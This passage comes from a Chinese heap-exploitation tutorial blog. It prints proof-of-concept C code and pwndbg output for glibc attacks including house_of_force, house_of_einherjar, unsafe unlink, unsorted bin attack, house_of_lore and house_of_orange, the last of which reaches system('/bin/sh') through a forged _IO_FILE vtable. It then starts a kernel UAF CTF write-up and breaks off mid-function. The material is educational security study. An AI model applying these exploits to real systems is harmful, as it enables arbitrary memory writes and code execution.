sizeof(long)) = -1;// -1 ==&gt;0xffffffffffffffff fprintf(stderr, "New size of top chunk %#llx\n", *((unsigned long long int *)((char *)ptr_top + sizeof(long)))); //------------------------ unsigned long evil_size = (unsigned long)bss_var - sizeof(long)*4 - (unsigned long)ptr_top; fprintf(stderr, "\nThe value we want to write to at %p, and the top chunk is at %p, so accounting for the header size,\n" "we will malloc %#lx bytes.\n", bss_var, ptr_top, evil_size); void *new_ptr = malloc(evil_size); void* ctr_chunk = malloc(100); fprintf(stderr, "\nNow, the next chunk we overwrite will point at our target buffer.\n"); fprintf(stderr, "malloc(100) =&gt; %p!\n", ctr_chunk); fprintf(stderr, "Now, we can finally overwrite that value:\n"); fprintf(stderr, "... old string: %s\n", bss_var); fprintf(stderr, "... doing strcpy overwrite with \"YEAH!!!\"...\n"); strcpy(ctr_chunk, "YEAH!!!"); fprintf(stderr, "... new string: %s\n", bss_var);&#125; house_of_force是一种针对top_chunk的攻击，需要满足两点条件： 能控制top_chunk的size字段 能够自由的分配堆的大小 原理： 123456假设有一个溢出漏洞，可以改写 top chunk 的size字段，然后将其改为一个非常大的值，以确保所有的 malloc 将使用 top chunk 分配，而不会调用 mmap。这时如果攻击者 malloc 一个很大的数目（负有符号整数），top chunk 的位置加上这个大数，造成整数溢出，结果是 top chunk 能够被转移到堆之前的内存地址（如程序的 .bss 段、.data 段、GOT 表等），下次再执行 malloc 时，攻击者就能够控制转移之后地址处的内存。 这个例子主要展示了通过top_chunk实现任意高地址的分配，首先将top_chunk的size字段修改为一个很大的值，这里直接修改为-1（32位下也就是0xffffffff，64位下就是0xffffffffffffffff），然后通过分配很大的内存，将top_chunk的地址抬高到我们想要控制的内存附近，然后再malloc就可以分配到想要控制的内存。 这里比较关键的是分配大小的计算 也就是evil_size的计算，计算方法如下 123456789/* * The evil_size is calulcated as (nb is the number of bytes requested + space for metadata): * new_top = old_top + nb * nb = new_top - old_top * req + 2sizeof(long) = new_top - old_top * req = new_top - old_top - 2sizeof(long) * req = dest - 2sizeof(long) - old_top - 2sizeof(long) * req = dest - old_top - 4*sizeof(long) */ 简单的来说 evil_size = dest - top_chunk_add - size(chunk_header) size(chunk_header)是chunk头的大小，32位时为0x10,64位时为0x20 简单调试下: 修改top_chunk的size字段 12345678pwndbg&gt; p ptr_top $2 = (intptr_t *) 0x603110pwndbg&gt; x/10gx 0x6031100x603110: 0x0000000000000000 0xffffffffffffffff0x603120: 0x0000000000000000 0x00000000000000000x603130: 0x0000000000000000 0x00000000000000000x603140: 0x0000000000000000 0x00000000000000000x603150: 0x0000000000000000 0x0000000000000000 分配evil_chunk，将top_chunk地址抬高到 目标地址 p &bss_var 12345678910$5 = (char (*)[44]) 0x602060 &lt;bss_var&gt;pwndbg&gt; top_chunk 0x602050 PREV_INUSE &#123; prev_size = 0x0, size = 0x10b9, fd = 0x2073692073696854, bk = 0x676e697274732061, fd_nextsize = 0x6577207461687420, bk_nextsize = 0x6f7420746e617720&#125; 最后就可以分配到包含目标地址的chunk了 输出结果 House of Einherjar源码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;#include &lt;malloc.h&gt;int main()&#123; fprintf(stderr, "Welcome to House of Einherjar!\n"); fprintf(stderr, "Tested in Ubuntu 16.04 64bit.\n"); fprintf(stderr, "This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.\n"); uint8_t* a; uint8_t* b; uint8_t* d; fprintf(stderr, "\nWe allocate 0x38 bytes for 'a'\n"); a = (uint8_t*) malloc(0x38); fprintf(stderr, "a: %p\n", a); int real_a_size = malloc_usable_size(a); fprintf(stderr, "Since we want to overflow 'a', we need the 'real' size of 'a' after rounding: %#x\n", real_a_size); // create a fake chunk fprintf(stderr, "\nWe create a fake chunk wherever we want, in this case we'll create the chunk on the stack\n"); fprintf(stderr, "However, you can also create the chunk in the heap or the bss, as long as you know its address\n"); fprintf(stderr, "We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks\n"); fprintf(stderr, "(although we could do the unsafe unlink technique here in some scenarios)\n"); size_t fake_chunk[6]; fake_chunk[0] = 0x100; // prev_size is now used and must equal fake_chunk's size to pass P-&gt;bk-&gt;size == P-&gt;prev_size fake_chunk[1] = 0x100; // size of the chunk just needs to be small enough to stay in the small bin fake_chunk[2] = (size_t) fake_chunk; // fwd fake_chunk[3] = (size_t) fake_chunk; // bck fake_chunk[4] = (size_t) fake_chunk; //fwd_nextsize fake_chunk[5] = (size_t) fake_chunk; //bck_nextsize fprintf(stderr, "Our fake chunk at %p looks like:\n", fake_chunk); fprintf(stderr, "prev_size (not used): %#lx\n", fake_chunk[0]); fprintf(stderr, "size: %#lx\n", fake_chunk[1]); fprintf(stderr, "fwd: %#lx\n", fake_chunk[2]); fprintf(stderr, "bck: %#lx\n", fake_chunk[3]); fprintf(stderr, "fwd_nextsize: %#lx\n", fake_chunk[4]); fprintf(stderr, "bck_nextsize: %#lx\n", fake_chunk[5]); /* In this case it is easier if the chunk size attribute has a least significant byte with * a value of 0x00. The least significant byte of this will be 0x00, because the size of * the chunk includes the amount requested plus some amount required for the metadata. */ b = (uint8_t*) malloc(0xf8); int real_b_size = malloc_usable_size(b); fprintf(stderr, "\nWe allocate 0xf8 bytes for 'b'.\n"); fprintf(stderr, "b: %p\n", b); uint64_t* b_size_ptr = (uint64_t*)(b - 8); /* This technique works by overwriting the size metadata of an allocated chunk as well as the prev_inuse bit*/ fprintf(stderr, "\nb.size: %#lx\n", *b_size_ptr); fprintf(stderr, "b.size is: (0x100) | prev_inuse = 0x101\n"); fprintf(stderr, "We overflow 'a' with a single null byte into the metadata of 'b'\n"); a[real_a_size] = 0; fprintf(stderr, "b.size: %#lx\n", *b_size_ptr); fprintf(stderr, "This is easiest if b.size is a multiple of 0x100 so you " "don't change the size of b, only its prev_inuse bit\n"); fprintf(stderr, "If it had been modified, we would need a fake chunk inside " "b where it will try to consolidate the next chunk\n"); // Write a fake prev_size to the end of a fprintf(stderr, "\nWe write a fake prev_size to the last %lu bytes of a so that " "it will consolidate with our fake chunk\n", sizeof(size_t)); size_t fake_size = (size_t)((b-sizeof(size_t)*2) - (uint8_t*)fake_chunk); fprintf(stderr, "Our fake prev_size will be %p - %p = %#lx\n", b-sizeof(size_t)*2, fake_chunk, fake_size); *(size_t*)&amp;a[real_a_size-sizeof(size_t)] = fake_size; //Change the fake chunk's size to reflect b's new prev_size fprintf(stderr, "\nModify fake chunk's size to reflect b's new prev_size\n"); fake_chunk[1] = fake_size; // free b and it will consolidate with our fake chunk fprintf(stderr, "Now we free b and this will consolidate with our fake chunk since b prev_inuse is not set\n"); free(b); fprintf(stderr, "Our fake chunk size is now %#lx (b.size + fake_prev_size)\n", fake_chunk[1]); fprintf(stderr, "\nNow we can call malloc() and it will begin in our fake chunk\n"); d = malloc(0x200); fprintf(stderr, "Next malloc(0x200) is at %p\n", d);&#125; house_of_einherjar主要利用了free函数中的向后合并的操作的机制，可以通过malloc返回任意地址的chunk。 这个例子中，它在栈上伪造了一个fake_chunk，然后修改chunk_b的prev_size字段 以及 size字段的prev_inuse标志位。使prev_size = b - fake_chunk - sizeof(chunk_header)， prev_inuse为0。然后当free掉b时，它会向后合并，最后得到的chunk地址就会为fake_chunk，当再次malloc时，就可以分配到栈上的空间。 伪造的fake_chunk的size==&gt; b - fake_chunk - sizeof(chunk_header) 注意： 伪造的fake_chunk中的 fd和bk指针要指向自己，用来bypass unlink 后向合并时，新的 chunk 的位置取决于 chunk_at_offset(p, -((long) prevsize)) 相邻的chunk会共享prev_size字段，当低地址的chunk处于使用状态时，高地址的chunk的prev_size字段就可以被低地址的chunk使用，形成空间的复用，所以可能可以通过低地址的chunk修改高地址的chunk的prev_inuse标志位。 调试一下： 伪造的fake_chunk 123456pwndbg&gt; x/10gx &amp;fake_chunk 0x7fffffffdd10: 0x0000000000000100 0xffff8000006053300x7fffffffdd20: 0x00007fffffffdd10 0x00007fffffffdd100x7fffffffdd30: 0x00007fffffffdd10 0x00007fffffffdd100x7fffffffdd40: 0x00007fffffffde30 0x0e2957f6498f50000x7fffffffdd50: 0x0000000000400c00 0x00007ffff7a2d830 free掉b后，返回的chunk，可以发现fake_chunk的size字段增大了 b.size的大小 123456pwndbg&gt; x/10gx &amp;fake_chunk 0x7fffffffdd10: 0x0000000000000100 0xffff8000006262f10x7fffffffdd20: 0x00007fffffffdd10 0x00007fffffffdd100x7fffffffdd30: 0x00007fffffffdd10 0x00007fffffffdd100x7fffffffdd40: 0x00007fffffffde30 0x0e2957f6498f50000x7fffffffdd50: 0x0000000000400c00 0x00007ffff7a2d830 最后malloc便可以返回fake_chunk的内存 运行结果 unsafe_unlink这个我前面总结过了，这里就讲解一下这个例子 源码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;uint64_t *chunk0_ptr;int main()&#123; fprintf(stderr, "Welcome to unsafe unlink 2.0!\n"); fprintf(stderr, "Tested in Ubuntu 14.04/16.04 64bit.\n"); fprintf(stderr, "This technique can be used when you have a pointer at a known location to a region you can call unlink on.\n"); fprintf(stderr, "The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.\n"); int malloc_size = 0x80; //we want to be big enough not to use fastbins int header_size = 2; fprintf(stderr, "The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\n\n"); chunk0_ptr = (uint64_t*) malloc(malloc_size); //chunk0 uint64_t *chunk1_ptr = (uint64_t*) malloc(malloc_size); //chunk1 fprintf(stderr, "The global chunk0_ptr is at %p, pointing to %p\n", &amp;chunk0_ptr, chunk0_ptr); fprintf(stderr, "The victim chunk we are going to corrupt is at %p\n\n", chunk1_ptr); fprintf(stderr, "We create a fake chunk inside chunk0.\n"); fprintf(stderr, "We setup the 'next_free_chunk' (fd) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;fd-&gt;bk = P.\n"); chunk0_ptr[2] = (uint64_t) &amp;chunk0_ptr-(sizeof(uint64_t)*3); fprintf(stderr, "We setup the 'previous_free_chunk' (bk) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;bk-&gt;fd = P.\n"); fprintf(stderr, "With this setup we can pass this check: (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False\n"); chunk0_ptr[3] = (uint64_t) &amp;chunk0_ptr-(sizeof(uint64_t)*2); fprintf(stderr, "Fake chunk fd: %p\n",(void*) chunk0_ptr[2]); fprintf(stderr, "Fake chunk bk: %p\n\n",(void*) chunk0_ptr[3]); fprintf(stderr, "We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\n"); uint64_t *chunk1_hdr = chunk1_ptr - header_size; fprintf(stderr, "We shrink the size of chunk0 (saved as 'previous_size' in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\n"); fprintf(stderr, "It's important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly\n"); chunk1_hdr[0] = malloc_size; fprintf(stderr, "If we had 'normally' freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: %p\n",(void*)chunk1_hdr[0]); fprintf(stderr, "We mark our fake chunk as free by setting 'previous_in_use' of chunk1 as False.\n\n"); chunk1_hdr[1] &amp;= ~1; fprintf(stderr, "Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\n"); free(chunk1_ptr); fprintf(stderr, "At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\n"); char victim_string[8]; strcpy(victim_string,"Hello!~"); chunk0_ptr[3] = (uint64_t) victim_string; fprintf(stderr, "chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\n"); fprintf(stderr, "Original value: %s\n",victim_string); chunk0_ptr[0] = 0x4141414142424242LL; fprintf(stderr, "New Value: %s\n",victim_string);&#125; 在这个例子中它定义了一个全局指针来存储 chunk0的地址，chunk0 malloc的大小为0x80，分配这么大的目的是为了释放chunk0时不会被放入fastbin中。然后它分配了一个大小为0x80的chunk2，并且将chunk0的fd和bk伪造好 fd ==&gt; (uint64_t) &amp;chunk0_ptr - (sizeof(uint64_t)*3) bk==&gt; (uint64_t) &amp;chunk0_ptr - (sizeof(uint64_t)*2) 将chunk1的prev_size字段设置为 chunk0的大小，同时将prev_inuse位设置为0，最后将chunk1 释放掉，就会触发unlink。 涉及的指针操作 1234567FD = chunk0_ptr - 0x18BK = chunk0_ptr- 0x10unlink实际做了*(chunk0_ptr - 0x18 + 0x18) = chunk0_ptr - 0x10*(chunk0_ptr - 0x10 - 0x10) = chunk0_ptr - 0x18 #主要看这步等价于*chunk0_ptr = chunk0_ptr - 0x18 最后，原本存储着chunk0地址的指针chunk0_ptr，会指向chunk0_ptr - 0x18，这时候通过控制chunk0就可以实现任意地址写。此时chunk0_ptr-&gt;bk 正好指向 &amp;chunk0_ptr，修改chunk0_ptr-&gt;bk 为想要修改的地址，然后再通过chunk0_ptr往地址写入内容。 最终输出 unsorted_bin_attack源码： 1234567891011121314151617181920212223242526272829303132333435#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main()&#123; fprintf(stderr, "This file demonstrates unsorted bin attack by write a large unsigned long value into stack\n"); fprintf(stderr, "In practice, unsorted bin attack is generally prepared for further attacks, such as rewriting the " "global variable global_max_fast in libc for further fastbin attack\n\n"); unsigned long stack_var=0; fprintf(stderr, "Let's first look at the target we want to rewrite on stack:\n"); fprintf(stderr, "%p: %ld\n\n", &amp;stack_var, stack_var); unsigned long *p=malloc(400); fprintf(stderr, "Now, we allocate first normal chunk on the heap at: %p\n",p); fprintf(stderr, "And allocate another normal chunk in order to avoid consolidating the top chunk with" "the first one during the free()\n\n"); malloc(500); free(p); fprintf(stderr, "We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer " "point to %p\n",(void*)p[1]); //------------VULNERABILITY----------- p[1]=(unsigned long)(&amp;stack_var-2); fprintf(stderr, "Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n"); fprintf(stderr, "And we write it with the target address-16 (in 32-bits machine, it should be target address-8):%p\n\n",(void*)p[1]); //------------------------------------ malloc(400); fprintf(stderr, "Let's malloc again to get the chunk we just free. During this time, the target should have already been " "rewritten:\n"); fprintf(stderr, "%p: %p\n", &amp;stack_var, (void*)stack_var);&#125; 这个例子展示了unorted_bin_attack，将栈上的一个值修改为一个很大的无符号整型数。具体的原理是，从unsorted bin中取chunk出来时会往bck-fd出写入unsorted bin的地址，所以只要控制了unsorted bin中的bk，就可以实现向任意地址写如一个不可控的值 具体源码： 12unsorted_chunks (av)-&gt;bk = bck;bck-&gt;fd = unsorted_chunks (av); 往bk写入的地址是 想要修改的地址 - sizeof(chunk_header) 利用这漏洞可以实现的事情： 修改 global_max_fast的大小，拓展fastbin attack的范围 修改循环的次数 运行结果 unsorted_bin_into_stack源码: 12345678910111213141516171819202122232425262728293031#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;int main() &#123; intptr_t stack_buffer[4] = &#123;0&#125;; fprintf(stderr, "Allocating the victim chunk\n"); intptr_t* victim = malloc(0x100); fprintf(stderr, "Allocating another chunk to avoid consolidating the top chunk with the small one during the free()\n"); intptr_t* p1 = malloc(0x100); fprintf(stderr, "Freeing the chunk %p, it will be inserted in the unsorted bin\n", victim); free(victim); fprintf(stderr, "Create a fake chunk on the stack"); fprintf(stderr, "Set size for next allocation and the bk pointer to any writable address"); stack_buffer[1] = 0x100 + 0x10; stack_buffer[3] = (intptr_t)stack_buffer; //------------VULNERABILITY----------- fprintf(stderr, "Now emulating a vulnerability that can overwrite the victim-&gt;size and victim-&gt;bk pointer\n"); fprintf(stderr, "Size should be different from the next request size to return fake_chunk and need to pass the check 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem\n"); victim[-1] = 32; victim[1] = (intptr_t)stack_buffer; // victim-&gt;bk is pointing to stack //------------------------------------ fprintf(stderr, "Now next malloc will return the region of our fake chunk: %p\n", &amp;stack_buffer[2]); fprintf(stderr, "malloc(0x100): %p\n", malloc(0x100));&#125; 这个例子展示了怎么利用unsorted bin 的分配机制，返回一个在栈上伪造的chunk。因为unsorted bin是FIFO，新插入的chunk是插到表头，然后从表尾取chunk。将victim chunk的bk修改为fake_chunk，size字段修改为别的值，最后malloc相应的大小，就可以返回伪造的fake_chunk了。 需要满足的条件： 可以控制unsorted bin 中victim chunk的size字段和bk字段 泄露出栈地址，并在栈上布置好fake_chunk victim_chunk的大小应该满足不同于将要分配的大小以及 大于2*SIZE_SZ 和 小于av-&gt;system_mem 运行结果： house_of_lore源码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;void jackpot()&#123; puts("Nice jump d00d"); exit(0); &#125;int main(int argc, char * argv[])&#123; intptr_t* stack_buffer_1[4] = &#123;0&#125;; intptr_t* stack_buffer_2[3] = &#123;0&#125;; fprintf(stderr, "\nWelcome to the House of Lore\n"); fprintf(stderr, "This is a revisited version that bypass also the hardening check introduced by glibc malloc\n"); fprintf(stderr, "This is tested against Ubuntu 14.04.4 - 32bit - glibc-2.23\n\n"); fprintf(stderr, "Allocating the victim chunk\n"); intptr_t *victim = malloc(100); fprintf(stderr, "Allocated the first small chunk on the heap at %p\n", victim); // victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk intptr_t *victim_chunk = victim-2; fprintf(stderr, "stack_buffer_1 at %p\n", (void*)stack_buffer_1); fprintf(stderr, "stack_buffer_2 at %p\n", (void*)stack_buffer_2); fprintf(stderr, "Create a fake chunk on the stack\n"); fprintf(stderr, "Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted" "in second to the last malloc, which putting stack address on smallbin list\n"); stack_buffer_1[0] = 0; stack_buffer_1[1] = 0; stack_buffer_1[2] = victim_chunk; fprintf(stderr, "Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 " "in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake " "chunk on stack"); stack_buffer_1[3] = (intptr_t*)stack_buffer_2; stack_buffer_2[2] = (intptr_t*)stack_buffer_1; fprintf(stderr, "Allocating another large chunk in order to avoid consolidating the top chunk with" "the small one during the free()\n"); void *p5 = malloc(1000); fprintf(stderr, "Allocated the large chunk on the heap at %p\n", p5); fprintf(stderr, "Freeing the chunk %p, it will be inserted in the unsorted bin\n", victim); free((void*)victim); fprintf(stderr, "\nIn the unsorted bin the victim's fwd and bk pointers are nil\n"); fprintf(stderr, "victim-&gt;fwd: %p\n", (void *)victim[0]); fprintf(stderr, "victim-&gt;bk: %p\n\n", (void *)victim[1]); fprintf(stderr, "Now performing a malloc that can't be handled by the UnsortedBin, nor the small bin\n"); fprintf(stderr, "This means that the chunk %p will be inserted in front of the SmallBin\n", victim); void *p2 = malloc(1200); fprintf(stderr, "The chunk that can't be handled by the unsorted bin, nor the SmallBin has been allocated to %p\n", p2); fprintf(stderr, "The victim chunk has been sorted and its fwd and bk pointers updated\n"); fprintf(stderr, "victim-&gt;fwd: %p\n", (void *)victim[0]); fprintf(stderr, "victim-&gt;bk: %p\n\n", (void *)victim[1]); //------------VULNERABILITY----------- fprintf(stderr, "Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n"); victim[1] = (intptr_t)stack_buffer_1; // victim-&gt;bk is pointing to stack //------------------------------------ fprintf(stderr, "Now allocating a chunk with size equal to the first one freed\n"); fprintf(stderr, "This should return the overwritten victim chunk and set the bin-&gt;bk to the injected victim-&gt;bk pointer\n"); void *p3 = malloc(100); fprintf(stderr, "This last malloc should trick the glibc malloc to return a chunk at the position injected in bin-&gt;bk\n"); char *p4 = malloc(100); fprintf(stderr, "p4 = malloc(100)\n"); fprintf(stderr, "\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\n", stack_buffer_2[2]); fprintf(stderr, "\np4 is %p and should be on the stack!\n", p4); // this chunk will be allocated on stack intptr_t sc = (intptr_t)jackpot; // Emulating our in-memory shellcode memcpy((p4+40), &amp;sc, 8); // This bypasses stack-smash detection since it jumps over the canary&#125; house_of_lore利用了small bins的分配机制，可以实现分配任意指定位置的 chunk，从而修改任意地址的内存。 相关代码: 123456789101112else &#123; bck = victim-&gt;bk; if (__glibc_unlikely (bck-&gt;fd != victim))&#123; errstr = "malloc(): smallbin double linked list corrupted"; goto errout; &#125; set_inuse_bit_at_offset (victim, nb); bin-&gt;bk = bck; bck-&gt;fd = bin; 可以发现它只检查了bck-fd 是否等于victIm，但是没检查bck。所以可以伪造fake_chunk，使victIm-&gt;bk = fake_chunk，当victim被分配时，fake_chunk就会被链入small bins中，但是为了能成功返回fake_chunk，还要伪造一个chunk，使fake_chunk能通过__glibc_unlikely (bck-&gt;fd != victim) 检查 所以在这个例子中，它伪造了两个fake_chunk 123456fake_chunk1fd = victimbk = fake_chunk2---------fake_chunk2fd = fake_chunk1 调试一下： victim被加入small bins 时 12345678910pwndbg&gt; p victim$2 = (intptr_t *) 0x603010pwndbg&gt; smallbins smallbins0x70: 0x7ffff7dd1bd8 (main_arena+184) —▸ 0x603000 ◂— 0x7ffff7dd1bd8pwndbg&gt; parseheap addr prev size status fd bk 0x603000 0x0 0x70 Freed 0x7ffff7dd1bd8 0x7ffff7dd1bd80x603070 0x70 0x3f0 Used None None0x603460 0x0 0x4c0 Used None None 将stack_chunk_1地址写入 victim-&gt;bk victim被分配后，stack_chunk_1被链入small_bins中，再分配对应大小的chunk，就可以分配到stack_chunk_1了，就可以修改栈上的内容，比如返回地址什么的，控制程序的执行流。 输出结果： house_of_orange源码：(它注释太多了，我把它都删了，不过它注释把原理都讲的挺明白了) 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;int winner ( char *ptr);int main()&#123; char *p1, *p2; size_t io_list_all, *top; fprintf(stderr, "The attack vector of this technique was removed by changing the behavior of malloc_printerr, " "which is no longer calling _IO_flush_all_lockp, in 91e7cf982d0104f0e71770f5ae8e3faf352dea9f (2.26).\n"); fprintf(stderr, "Since glibc 2.24 _IO_FILE vtable are checked against a whitelist breaking this exploit," "https://sourceware.org/git/?p=glibc.git;a=commit;h=db3476aff19b75c4fdefbe65fcd5f0a90588ba51\n"); /* Firstly, lets allocate a chunk on the heap. */ p1 = malloc(0x400-16); top = (size_t *) ( (char *) p1 + 0x400 - 16); top[1] = 0xc01; p2 = malloc(0x1000); top[3] = io_list_all - 0x10; memcpy( ( char *) top, "/bin/sh\x00", 8); top[1] = 0x61; _IO_FILE *fp = (_IO_FILE *) top; fp-&gt;_mode = 0; // top+0xc0 fp-&gt;_IO_write_base = (char *) 2; // top+0x20 fp-&gt;_IO_write_ptr = (char *) 3; // top+0x28 size_t *jump_table = &amp;top[12]; // controlled memory jump_table[3] = (size_t) &amp;winner; *(size_t *) ((size_t) fp + sizeof(_IO_FILE)) = (size_t) jump_table; // top+0xd8 /* Finally, trigger the whole chain by calling malloc */ malloc(10); /* The libc's error message will be printed to the screen But you'll get a shell anyways. */ return 0;&#125;int winner(char *ptr)&#123; system(ptr); return 0;&#125; house_of_orange是一种 堆溢出和IO_FILE利用结合的攻击手法。最主要的特点是它没有free的功能，它需要通过漏洞来达到free的效果。 前提条件： 存在堆溢出，可以控制top_chunk的size字段 存在信息泄露，能泄露出堆的地址 libc版本小于等于2.3 简单讲下house_of_orange的流程。 首先，通过堆溢出修改top_chunk的size字段，使top_chunk的size减小。然后，malloc一个比top_chunk大的的chunk，就会通过sysmalloc申请一个新的top_chunk，旧的top_chunk就会被free掉，加入unsorted bin中。然后通过unsorted bin attack往_IO_list_all 中写入main_aren + 88，此时 _IO_list_all中的 *chain指针位于 _IO_list_all + 0x68的位置，也就是 main_arena + 0x58 + 0x68–&gt;small bin中大小为0x60的位置，所以将之前的old top chunk的size修改为0x61，old top chunk就会链入small bin中，这时就可以将伪造的fake_file链入IO_all_list中,将fake_file的vtable指向伪造的IO_jump_t结构的地址，在伪造的 IO_jump_t 结构体中，在overflow函数处写入system函数，则最终会调用system函数。 几个要注意的点： top_chunk的size字段修改要页对齐，不能随便修改，同时prev_inuse位必须为1 伪造的IO_File结构体 要过几个检查 12345671.((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base) 或者是2._IO_vtable_offset (fp) == 0 &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base) 查看伪造的_IO_FILE结构体 和vtable 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859pwndbg&gt; p *((struct _IO_FILE_plus *)0x602400)$3 = &#123; file = &#123; _flags = 0x6e69622f, _IO_read_ptr = 0x61 &lt;error: Cannot access memory at address 0x61&gt;, _IO_read_end = 0x7ffff7dd1b78 &lt;main_arena+88&gt; &quot;\020@b&quot;, _IO_read_base = 0x7ffff7dd2510 &quot;&quot;, _IO_write_base = 0x2 &lt;error: Cannot access memory at address 0x2&gt;, _IO_write_ptr = 0x3 &lt;error: Cannot access memory at address 0x3&gt;, _IO_write_end = 0x0, _IO_buf_base = 0x0, _IO_buf_end = 0x0, _IO_save_base = 0x0, _IO_backup_base = 0x0, _IO_save_end = 0x0, _markers = 0x0, _chain = 0x0, _fileno = 0x0, _flags2 = 0x0, _old_offset = 0x40078f, _cur_column = 0x0, _vtable_offset = 0x0, _shortbuf = &quot;&quot;, _lock = 0x0, _offset = 0x0, _codecvt = 0x0, _wide_data = 0x0, _freeres_list = 0x0, _freeres_buf = 0x0, __pad5 = 0x0, _mode = 0x0, _unused2 = &apos;\000&apos; &lt;repeats 19 times&gt; &#125;, vtable = 0x602460&#125;pwndbg&gt; p *((struct _IO_FILE_plus *)0x602400).vtable$4 = &#123; __dummy = 0x0, __dummy2 = 0x0, __finish = 0x0, __overflow = 0x40078f &lt;winner&gt;, __underflow = 0x0, __uflow = 0x0, __pbackfail = 0x0, __xsputn = 0x0, __xsgetn = 0x0, __seekoff = 0x0, __seekpos = 0x0, __setbuf = 0x0, __sync = 0x0, __doallocate = 0x0, __read = 0x0, __write = 0x602460, __seek = 0x0, __close = 0x0, __stat = 0x0, __showmanyc = 0x0, __imbue = 0x0&#125; 最终结果：]]></content>
      <categories>
        <category>Heap_Exploitation</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>houseofxxx</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【kernel-UAF】babydriver]]></title>
    <url>%2F2019%2F02%2F15%2F2019-2-15-kernel-UAF%2F</url>
    <content type="text"><![CDATA[题目来源：CISCN2017 babydriver 拿到手后是一个压缩包，解压后有三个文件 123boot.sh #启动脚本bzImage #内核binaryrootfs.cpio #文件系统映像 boot.sh ​ 可以发现开启了smep防护，而smep保护主要功能是禁止内核执行用户态的代码 将rootfs.cpio解压，查看里面的文件 ​ 可以发现flag的owner被设为root，以及它加载了babydriver.ko这个内核模块。很明显，漏洞应该就在这个模块中 防护机制： 1234567☁ 4.4.72 checksec babydriver.ko [*] &apos;/home/zs0zrc/pwn/kernel/babydriver/file/lib/modules/4.4.72/babydriver.ko&apos; Arch: amd64-64-little RELRO: No RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x0) 将内核模块取出，用ida分析 分析下主要的函数 babyrelease 1234567int __fastcall babyrelease(inode *inode, file *filp)&#123; _fentry__(inode, filp); kfree(babydev_struct.device_buf); //释放堆空间 printk("device release\n"); return 0;&#125; 这里涉及到了一个结构体 babydevice_t 123456700000000 babydevice_t struc ; (sizeof=0x10, align=0x8, copyof_429)00000000 ; XREF: .bss:babydev_struct/r00000000 device_buf dq ? ; XREF: babyrelease+6/r00000000 ; babyopen+26/w ... ; offset00000008 device_buf_len dq ? ; XREF: babyopen+2D/w00000008 ; babyioctl+3C/w ...00000010 babydevice_t ends babyopen 申请一块大小为0x40的空间，地址赋给babydev_struct.device_buf，同时将babydev_struct.device_buf_len设为0x40 12345678int __fastcall babyopen(inode *inode, file *filp)&#123; _fentry__(inode, filp); babydev_struct.device_buf = (char *)kmem_cache_alloc_trace(kmalloc_caches[6], 37748928LL, 64LL); babydev_struct.device_buf_len = 64LL; printk("device open\n"); return 0;&#125; babyioctl 这个函数实现了一个设备控制命令0x10001，功能是将全局变量 babydev_struct中的babydev_struct.device_buf释放掉，然后再根据用户传入的size重新申请一块空间，并且将babydev_struct.device_buf_len设置为对应的值 123456789101112131415161718192021222324// local variable allocation has failed, the output may be wrong!__int64 __fastcall babyioctl(file *filp, unsigned int command, unsigned __int64 arg)&#123; size_t v3; // rdx size_t v4; // rbx __int64 result; // rax _fentry__(filp, *(_QWORD *)&amp;command); v4 = v3; if ( command == 0x10001 ) &#123; kfree(babydev_struct.device_buf); babydev_struct.device_buf = (char *)_kmalloc(v4, 37748928LL); babydev_struct.device_buf_len = v4; printk("alloc done\n"); result = 0LL; &#125; else &#123; printk(&amp;unk_2EB); result = -22LL; &#125; return result;&#125; babywirte 这里我用ida反编译的代码看的有点奇怪，所以我看了下汇编的代码，这里copy_from_user()中的参数应该是 copy_from_user(babydev_struct.device_buf,buffer,length)，就是从用户空间buffer中拷贝数据到babydev_struct.device_buf 1234567891011121314151617ssize_t __fastcall babywrite(file *filp, const char *buffer, size_t length, loff_t 